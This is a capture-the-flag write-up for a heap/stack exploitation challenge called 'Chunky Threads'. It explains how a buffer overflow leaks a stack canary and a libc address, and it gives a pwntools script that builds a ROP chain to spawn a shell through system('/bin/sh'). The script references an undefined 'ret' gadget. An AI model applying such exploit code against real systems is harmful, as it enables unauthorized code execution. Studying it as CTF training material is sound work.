#  Chunky Threads 

**Challenge Description**:
Give the chonk a chunk and he just gets chonkier. Teach him to chunk and he will forestack smashing detected.

**Points**:
168

**Solution**:
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'/nix/store/hbc8c6fc17xnl85jxlcn9d4kxbyjj6il-shell/lib:/nix/store/cg9s562sa33k78m63njfn1rw47dp9z0i-glibc-2.40-66/lib:/nix/store/7c0v0kbrrdc2cqgisi78jdqxn73n3401-gcc-14.2.1.20250322-lib/lib'
    Stripped:   No
```
First of all - who tf makes a disgusting wrapper like this?
```sh
#!/bin/bash
cd /app
exec /lib64/ld-linux-x86-64.so.2 ./chall "$@"
```
And it's linked to some wierd NixOS stuff? Whatever.

This binary has 3 functions:
1. We can set a number of chunks
2. We can create a chunk that will be printed n times with a delay of j seconds. We control both n and j
3. We can read our chunk

When creating a chunk, we can send unlimited bytes. It will then later be copied into a 64 byte buffer - this means we have a buffer overflow. Whatever we send will be printed back to us using `puts`. Our first challenge is to bypass the stack canary!
If we fill the entire buffer + the first byte of the canary (which is a null byte and would terminate the puts, which we don't want), the stack canary will be sent back to us... And since we decide the delay for the function, we can make sure it doesn't reach stack canary check.
Hence, the first part of our solution script:
```python
from pwn import *

def chunks(n):
    p.sendline(f'CHUNKS {n}'.encode())
    p.recvuntil(b'set nthread to')
    return

def chunk(sleep_time, nTimes, data):
    print(f'Sending chunk with sleep_time={sleep_time}, nTimes={nTimes}, data={data}')
    p.send(f'CHUNK {sleep_time} {nTimes} '.encode() + data)

def chonk():
    print(p.recvuntil(b'\n\n').decode())
    return
e = ELF('./chall')
libc = ELF('./libc.so.6')
p = process('./wrapper.sh')

chunks(3)
chunk(60, 2, b'A' * 72 + b'\n')
p.recvuntil(b'A'*72)
canary_leak = p.recv(8).replace(b'\n', b'\x00')
canary_leak = int.from_bytes(canary_leak, 'little')
print(f'Canary leak: {hex(canary_leak)}')
```
Nice! I then noticed there was an address that was sent with the stack canary. It just so happens that the address has a fixed offset from libc - that means we have a libc leak!
```python
leak_2 = int.from_bytes(p.recvline().strip(), 'little')
print(f'Leak 2: {hex(leak_2)}')
```
So now we need to make a ROP chain that will run system. and make another chunk which overflows the entire buffer, the canary with the correct value and then overwrites the return address to our chain.
So then we have the last part of our program
```python
libc_base = leak_2+0x1090 # This worked on my pc - however on the container the offset was 0x4090. Thanks to zopazz for helping me finding this out
print(f'Libc base: {hex(libc_base)}')

pop_rdi = libc_base + 0x000000000010f75b
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']
puts = libc_base + libc.symbols['puts']

payload = b'A' * 72
payload += p64(canary_leak)
payload += p64(0xdeadbeef)
payload += p64(ret)  # Return to ret gadget
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

chunk(2, 1, payload)
p.interactive()
```
And them boom, we have a shell which processes our commands like 1/4th of the time because of weird thread stuff. 
[Solve script](./exploit.py)